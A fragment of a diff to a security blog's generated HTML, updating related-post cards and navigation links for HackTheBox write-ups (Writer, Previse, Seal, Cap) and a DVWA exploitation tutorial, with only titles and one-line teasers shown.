+<h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writer - HackTheBox</h3>
             <div class="text-muted small">
-              <p>In this little tutorial, I demonstrate how to use mitmproxy and elinks to exploit a vulnerable web app completely from the command line. The target used is DVWA (Damn Vulnerable Web Application), w...
+              <p>Writer is definitely one of the toughest boxes I have ever solved at the time of writing this. It features a website that is vulnerable to SQL injection, which leads to authentication bypass. Once ...
               </p>
             </div>
           </div>
         </a>
       </div><div class="card">
-        <a href="/posts/hackthebox/seal.html">
+        <a href="/posts/hackthebox/previse.html">
           <div class="card-body"><!--
   Date format snippet
   See: ${JS_ROOT}/utils/timeago.js
 --><em class="timeagosmall"
-    date="2021-11-13 00:00:00 +0100">Nov 13, 2021</em>
-<h3 class="pt-0 mt-1 mb-3" data-toc-skip>Seal - HackTheBox</h3>
+    date="2022-01-16 00:00:00 +0100">Jan 16</em>
+<h3 class="pt-0 mt-1 mb-3" data-toc-skip>Previse - HackTheBox</h3>
             <div class="text-muted small">
-              <p>Seal is a medium linux box. It features a web service on port 443 running Apache Tomcat, and a GitBucket installation running locally, but accessible through the proxy on port 8080 (nginx). The Git...
+              <p>Previse is an easy linux box that I really enjoyed. It has an Execute After Redirect (EAR) vulnerability, whereby the application issues a redirect when an unauthenticated user is attempting to acc...
               </p>
             </div>
           </div>
@@ -472,13 +481,13 @@ Service detection performed. Please report any incorrect results at https://nmap
   Navigation buttons at the bottom of the post.
 -->
 
-<div class="post-navigation d-flex justify-content-between"><a href="/posts/hackthebox/cap.html" class="btn btn-outline-primary"
+<div class="post-navigation d-flex justify-content-between"><a href="/posts/tutorial/mitmproxy.html" class="btn btn-outline-primary"
     prompt="Older">
-    <p>Cap - HackTheBox</p>
-  </a><a href="/posts/ctf/synack5.html" class="btn btn-outline-primary"
+    <p>Exploiting Web Applications with MITM Proxy and Elinks</p>
+  </a><span class="btn btn-outline-primary disabled"
     prompt="Newer">
-    <p>Synack Red Team 5 CTF</p>
-  </a></div>
+    <p>-</p>
+  </span></div>
 <!--  The comments switcher --></div>
   </div>
 </div> <!-- .row --><!--
